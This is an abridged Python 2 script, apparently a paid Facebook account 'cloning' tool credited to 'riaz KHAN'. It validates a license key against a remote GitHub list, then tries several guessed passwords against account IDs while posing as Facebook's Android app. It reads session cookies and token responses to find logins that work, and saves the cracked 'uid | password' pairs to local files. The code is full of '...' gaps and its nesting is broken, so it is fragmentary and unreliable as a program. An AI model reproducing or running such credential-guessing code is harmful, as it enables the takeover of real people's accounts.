# riaz KHAN BAP SEY PANGA NAHI
#riaz KA BAP SHANKAR-XD ENTERSSSSSSS
...
'\x1b[1;91m' ༄Mr𝙧᭄•─────────────────•༄riaz𝙧᭄
'\x1b[1;91m'   Author      ||    riaz KHAN     
'\x1b[1;92m'   Github      ||     riazXkhan  
'\x1b[1;93m'   FB ID       ||    riaz Khan
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/riaz.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
    ...
    r1=requests.get("https://raw.githubusercontent.com/Red-Mafia/Paid-1/main/server.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_input():
    ...
    if mx=='1':
        ...
        os.system("rm -rf Paid-1")
        os.system("cp -f Paid-1/Paid-1 \\.")
        os.system("rm -rf Paid-1")
        time.sleep(5)
        ...
        os.system("xdg-open https://wa.me/+923188214442")
        time.sleep(3)
        main_system()
...
def numcloning():
    ...
    print ""
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄riaz𝙧᭄"| lolcat')
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
    ...
    print "\033[1;93m BAAKI NAAM TO SONA HOGAA [riaz])"
    print 40*'-'
    print ''
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[riaz-CP] "+uid + " | " + pass2
                            cp=open('riaz-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[riaz-OK] "+uid + " | " + pass3
                                    cp=open('riaz-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;91m[riaz-OK] "+uid + " | " + pass1
                    cp=open('riaz-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    ...
                    if "access_token" in q:
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            print "\x1b[1;91m[riaz-OK] "+uid + " | " + pass2
                            cp=open('riaz-ok.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;92m[riaz-CP] "+uid + " | " + pass5
                                                    cp=open('riaz-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[riaz-CP] "+uid + " | " + pass6
                                                            cp=open('riaz-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
